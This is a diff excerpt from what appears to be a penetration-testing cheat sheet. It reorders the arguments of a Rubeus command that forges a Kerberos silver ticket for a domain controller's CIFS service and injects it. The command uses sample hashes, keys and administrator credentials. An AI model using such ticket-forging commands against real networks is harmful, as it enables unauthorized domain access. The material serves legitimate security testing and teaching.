@@ -528,7 +528,7 @@ optional:
 - ```/ptt``` - inject ticket
 
 ```
-rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt
+rubeus.exe silver /service:cifs/dc1.ignite.local /user:whoever /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /domain:ecorp.lab /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01  /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /ptt
 ```
 
 * * *
